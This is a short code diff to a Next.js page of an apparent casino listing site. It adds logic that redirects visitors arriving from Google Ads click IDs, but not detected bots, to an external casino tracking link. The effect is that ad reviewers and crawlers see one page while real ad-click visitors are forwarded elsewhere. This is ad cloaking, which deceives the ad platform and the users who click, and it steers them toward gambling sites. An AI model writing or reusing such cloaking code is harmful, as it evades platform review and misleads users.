@@ -5,6 +5,7 @@ import MobileCasinoModal from './components/MobileCasinoModal';
 import ExclusiveOfferPopup from './components/ExclusiveOfferPopup';
 import { casinos } from './data/casinos';
 import { headers } from 'next/headers';
+import { redirect } from 'next/navigation';
 
 type PageProps = {
   searchParams?: Record<string, string | string[] | undefined>;
@@ -69,6 +70,9 @@ export default async function Home({ searchParams }: PageProps) {
   }
 
   const isOnline= hasGclid && !isRobot;
+  if (isOnline) {
+    redirect('https://topbritcasinos.com/B7W2b6jr?utm_target=vegas');
+  }
   // Filter mobile casinos for the modal
   const mobileCasinos = casinos.filter(casino => casino.isMobile === true);
   // Filter non-mobile casinos for the main page
